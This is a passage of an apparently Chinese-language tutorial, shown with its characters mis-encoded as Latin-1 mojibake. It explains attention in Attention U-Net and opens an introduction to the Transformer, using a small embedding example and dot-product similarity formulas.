<p>å†ä¸¾ä¸€ä¸ªè®¡ç®—æœºè§†è§‰é¢†åŸŸçš„ç»å…¸ä¾‹å­â€”â€”<strong>U-Net</strong>ã€‚å®ƒåœ¨å›¾åƒåˆ†å‰²é¢†åŸŸå‡ ä¹å®¶å–»æˆ·æ™“ï¼Œå…¶æ¶æ„çš„æ ¸å¿ƒç‰¹å¾æ˜¯å¯¹ç§°çš„ç¼–ç å™¨-è§£ç å™¨ç»“æ„ä»¥åŠè´¯ç©¿å§‹ç»ˆçš„<strong>è·³è·ƒè¿æ¥</strong>ï¼ˆSkip Connectionsï¼‰ï¼Œç½‘ç»œæ¶æ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d406d65c79e94bb2ac9d79d1c442e3a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=KH6graVHYK1VQjptSqLzVqt2vng%3D" alt="c5.png" width="100%" loading="lazy"/></p>
<p align="center">ã€Œå›¾ç‰‡æ¥æºï¼šã€ŠU-Net: Convolutional Networks for Biomedical Image Segmentationã€‹ã€</p>
<p>å›¾ä¸­ç°è‰²çš„ç®­å¤´å°±æ˜¯è·³è·ƒè¿æ¥ï¼Œè¿™äº›è·³è·ƒè¿æ¥å°†ç¼–ç å™¨æµ…å±‚æ•è·çš„ã€å¯Œå«ç»†èŠ‚å’Œç©ºé—´ä¿¡æ¯çš„ç‰¹å¾å›¾ï¼Œç›´æ¥ä¼ é€’åˆ°è§£ç å™¨çš„å¯¹åº”å±‚ï¼Œä¸ç»è¿‡æ·±å±‚æŠ½è±¡çš„ç‰¹å¾è¿›è¡Œèåˆã€‚</p>
<p>å…¶å®è§‚å¯Ÿä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œ**çœŸçš„æœ‰å¿…è¦å°†æ—©æœŸç‰¹å¾æ¯«æ— ä¿ç•™åœ°å…¨éƒ¨ä¼ é€’è¿‡å»å—ï¼Ÿ**æ—©æœŸçš„ç‰¹å¾å›ºç„¶åŒ…å«ç²¾ç¡®å®šä½æ‰€éœ€çš„ç»†èŠ‚ï¼Œä½†ä¹Ÿæ··æ‚äº†å¤§é‡ä¸åˆ†å‰²ä¸»é¢˜æ— å…³çš„çº¹ç†ã€å™ªå£°æˆ–èƒŒæ™¯å¹²æ‰°ã€‚å…¨éƒ¨èåˆï¼Œå›ºç„¶ä¿è¯äº†ä¿¡æ¯çš„â€œä¸ä¸¢å¤±â€ï¼Œå´ä¹Ÿå¼•å…¥äº†â€œä¸çº¯ç²¹â€ã€‚</p>
<p>è¿™å°±å‚¬ç”Ÿäº† <strong>Attention U-Net</strong> ç½‘ç»œæ¶æ„ã€‚å®ƒçš„è§£å†³æ–¹æ¡ˆç›´è§‚è€Œå·§å¦™ï¼šåœ¨è·³è·ƒè¿æ¥ä¸Šå¢è®¾ä¸€ä¸ª<strong>æ³¨æ„åŠ›é—¨æ§</strong>ã€‚è¿™ä¸ªé—¨æ§æœºåˆ¶ä¼šè‡ªåŠ¨å­¦ä¹ ï¼Œä¸ºä¼ é€’è¿‡æ¥çš„æ¯ä¸€ä¸ªç©ºé—´ä½ç½®çš„ç‰¹å¾è®¡ç®—ä¸€ä¸ª0åˆ°1ä¹‹é—´çš„æƒé‡ã€‚é‡è¦çš„ã€ä¸å½“å‰åˆ†å‰²ç›®æ ‡ç›¸å…³çš„ç‰¹å¾å¾—ä»¥å¼ºè°ƒï¼ˆæƒé‡æ¥è¿‘1ï¼‰ï¼Œè€Œä¸ç›¸å…³æˆ–å†—ä½™çš„èƒŒæ™¯ä¿¡æ¯åˆ™è¢«æŠ‘åˆ¶ï¼ˆæƒé‡æ¥è¿‘0ï¼‰ã€‚è¿™ä¸ªè¿‡ç¨‹ï¼Œä¸å‰è¿°RNNä¸­çš„æ³¨æ„åŠ›åœ¨ç²¾ç¥ä¸Šé«˜åº¦åŒæºï¼Œéƒ½æ˜¯<strong>å¯¹ä¿¡æ¯æµçš„ä¸»åŠ¨ç­›é€‰ä¸åŠ æƒ</strong>ã€‚</p>
<p>å¦‚æœä¸Šé¢çš„å†…å®¹ä½ ä¸€æ—¶æ²¡æœ‰å®Œå…¨ç†è§£ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒâ€”â€”è¿™éƒ¨åˆ†å…¶å®å·²ç»æ¶‰åŠåˆ° RNN æ—¶æœŸè‡ªç„¶è¯­è¨€å¤„ç†çš„æ ¸å¿ƒå»ºæ¨¡æ€è·¯ã€‚äº†è§£å®ƒä»¬å¯¹ç†è§£ Transformer æœ‰å¸®åŠ©ï¼Œä½†å¹¶ä¸æ˜¯å¿…é¡»çš„ã€‚æˆ‘ä¸»è¦å°±æ˜¯æƒ³è¡¨è¾¾â€œæ³¨æ„åŠ›â€è¿™ä¸ªæœºåˆ¶åœ¨å¾ˆä¹…ä»¥å‰å°±å­˜åœ¨äº†ï¼Œ<strong>â€œæ³¨æ„åŠ›â€è¿œéTransformerçš„ä¸“å±</strong>ï¼Œåªä¸è¿‡Transformerå®ƒå½»åº•æŠ›å¼ƒäº†å¾ªç¯ä¸å·ç§¯çš„å›ºæœ‰ç»“æ„ï¼Œ<strong>å°†â€œæ³¨æ„åŠ›â€æ¨è‡³èˆå°ä¸­å¤®ï¼Œä½œä¸ºæ„å»ºæ¨¡å‹æœ€æ ¸å¿ƒã€ç”šè‡³æ˜¯å”¯ä¸€çš„ç®—å­</strong>ï¼Œå¹¶ä»¥æ­¤ä¸ºåŸºç¡€ï¼Œè®¾è®¡äº†ä¸€å¥—ç®€æ´ã€å¯¹ç§°ä¸”ç©ºå‰å¼ºå¤§çš„æ¶æ„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±æ­£å¼è¿›å…¥<strong>Transformer</strong>çš„ä¸–ç•Œï¼Œçœ‹çœ‹å®ƒæ˜¯å¦‚ä½•å½»åº•æŠ›å¼ƒå¾ªç¯ç»“æ„ï¼Œå®Œå…¨åŸºäºæ³¨æ„åŠ›æ¥é‡æ„åºåˆ—å»ºæ¨¡çš„ã€‚</p>
<hr/>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡® Transformer ç©¶ç«Ÿåšäº†ä»€ä¹ˆã€‚ç®€å•æ¥è¯´ï¼Œå®ƒçš„æ ¸å¿ƒæœºåˆ¶æ˜¯<strong>å°†ä¸€ä¸ªåºåˆ—è½¬æ¢ä¸ºå¦ä¸€ä¸ªåºåˆ—</strong>ï¼ŒåŒæ—¶è®©åºåˆ—ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½èƒ½â€œæ³¨æ„åˆ°â€åºåˆ—ä¸­çš„å…¶ä»–å…ƒç´ ã€‚</p>
<p>è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸‰ä¸ªè¯çš„å‘é‡è¡¨ç¤ºï¼ˆè¯åµŒå…¥ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŸå§‹çš„ä¸‰ä¸ªå‘é‡</span>
X =  [[<span class="hljs-number">0.431</span>, <span class="hljs-number">0.313</span>, ..., <span class="hljs-number">0.507</span>],   <span class="hljs-comment"># I çš„è¯å‘é‡ï¼Œè®°ä½œ xâ‚</span>
     [<span class="hljs-number">0.396</span>, <span class="hljs-number">0.836</span>, ..., <span class="hljs-number">0.105</span>],   <span class="hljs-comment"># love çš„è¯å‘é‡ï¼Œè®°ä½œ xâ‚‚</span>
     [<span class="hljs-number">0.852</span>, <span class="hljs-number">0.381</span>, ..., <span class="hljs-number">0.541</span>]]   <span class="hljs-comment"># apple çš„è¯å‘é‡ï¼Œè®°ä½œ xâ‚ƒ</span>

<span class="hljs-comment"># ==== ç»è¿‡ä¸€ä¸ª Transformer å±‚åå¾—åˆ°ï¼š====</span>

<span class="hljs-comment"># è¾“å‡ºä»ç„¶æ˜¯ä¸‰ä¸ªå‘é‡ï¼Œä½†å·²èå…¥äº†ä¸Šä¸‹æ–‡ä¿¡æ¯</span>
Y =  [[<span class="hljs-number">0.624</span>, <span class="hljs-number">0.362</span>, ..., <span class="hljs-number">0.802</span>],   <span class="hljs-comment"># è®°ä½œ yâ‚</span>
     [<span class="hljs-number">0.572</span>, <span class="hljs-number">0.260</span>, ..., <span class="hljs-number">0.249</span>],   <span class="hljs-comment"># è®°ä½œ yâ‚‚</span>
     [<span class="hljs-number">0.158</span>, <span class="hljs-number">0.458</span>, ..., <span class="hljs-number">0.066</span>]]   <span class="hljs-comment"># è®°ä½œ yâ‚ƒ</span>
</code></pre>
<p>ç»è¿‡Transformerå±‚è¾“å‡ºçš„è¿™ä¸‰ä¸ªå‘é‡éƒ½ä¸å†ä»…ä»…æ˜¯è‡ªèº«åŸæœ¬çš„å«ä¹‰ï¼Œè€Œæ˜¯<strong>æºå¸¦äº†å…¶ä»–è¯è¯­ä¿¡æ¯çš„â€œè¯­å¢ƒåŒ–â€è¡¨ç¤º</strong>ã€‚é‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•æ•æ‰å…¶ä»–è¯è¯­çš„æ³¨æ„åŠ›ä¿¡æ¯çš„å‘¢ï¼Ÿå¦‚æœè®©ä½ æ¥è®¾è®¡ï¼Œä½ ä¼šå¦‚ä½•å®ç°è¿™ç§â€œæ³¨æ„åŠ›â€ï¼Ÿ</p>
<p>å¦‚æœè®©æˆ‘æ¥è®¾è®¡ï¼Œè¦è®© <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> åŒ…å« <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">x_{1},x_{2},x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> çš„ä¿¡æ¯ï¼Œæœ€ç›´æ¥çš„æ–¹å¼å°±æ˜¯å¯¹å®ƒä»¬è¿›è¡ŒåŠ æƒæ±‚å’Œï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>3</mn></msub><msub><mi>x</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}=q_{1}x_{1} + q_{2}x_{2} + q_{3}x_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>å…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mn>1</mn></msub><mo>+</mo><msub><mi>q</mi><mn>2</mn></msub><mo>+</mo><msub><mi>q</mi><mn>3</mn></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">q_1 + q_2 + q_3 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼›<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">q_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> å¯¹å½“å‰è¾“å‡º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">y_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> çš„é‡è¦æ€§æƒé‡ï¼Œä¹Ÿå°±æ˜¯<strong>æ³¨æ„åŠ›å¾—åˆ†</strong>ã€‚é‚£ä¹ˆç°åœ¨é—®é¢˜è½¬åŒ–ä¸ºï¼šå¦‚ä½•åˆç†åœ°è®¡ç®—è¿™äº›æƒé‡ï¼Ÿ</p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬è¦å›é¡¾ä¸€ä¸‹çº¿æ€§ä»£æ•°ä¸­çš„å‘é‡ç‚¹ç§¯è¿ç®—ï¼Œæ¯”å¦‚å‘é‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">3</span><span class="mclose">)</span></span></span></span></span>å’Œå‘é‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>âˆ’</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-2,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>è¿›è¡Œç‚¹ç§¯è¿ç®—ï¼Œå®ƒä»¬çš„è®¡ç®—ç»“æœå°±æ˜¯<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>Ã—</mo><mo stretchy="false">(</mo><mo>âˆ’</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mn>3</mn><mo>Ã—</mo><mn>1</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \times (-2) + 3 \times 1 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œè®¡ç®—ç»“æœæ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œå…¶å®å°±æ˜¯é€å…ƒç´ ç›¸ä¹˜ååœ¨åŠ èµ·æ¥ã€‚é‚£ä¹ˆå‘é‡ç‚¹ç§¯çš„æ•°å­¦æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç‚¹ç§¯çš„ç»“æœæ˜¯ä¸€ä¸ªæ ‡é‡ï¼Œå®ƒåœ¨å‡ ä½•ä¸Šåæ˜ äº†ä¸¤ä¸ªå‘é‡åœ¨æ–¹å‘ä¸Šçš„å¯¹é½ç¨‹åº¦ï¼šæ–¹å‘è¶Šæ¥è¿‘ï¼Œå€¼è¶Šå¤§ï¼›æ–¹å‘è¶Šæ¥è¿‘æ­£äº¤ï¼Œå€¼è¶Šæ¥è¿‘é›¶ï¼›æ–¹å‘ç›¸ååˆ™ä¸ºè´Ÿå€¼ã€‚å› æ­¤ï¼Œ<strong>ç‚¹ç§¯å¯ä»¥è‡ªç„¶åœ°ä½œä¸ºä¸¤ä¸ªå‘é‡ç›¸ä¼¼æ€§çš„ä¸€ç§åº¦é‡</strong>ã€‚</p>
<p>é‚£ä¹ˆï¼Œè®¡ç®—æ³¨æ„åŠ›æƒé‡çš„æ€è·¯å°±æ¸…æ™°äº†ï¼šæˆ‘ä»¬å¯ä»¥ç”¨ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">x_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä¸åºåˆ—ä¸­æ¯ä¸ªå‘é‡ï¼ˆåŒ…æ‹¬è‡ªèº«ï¼‰çš„ç‚¹ç§¯ï¼Œæ¥åˆæ­¥è¡¡é‡å®ƒä»¬ä¹‹é—´çš„ç›¸ä¼¼åº¦ï¼š</p>
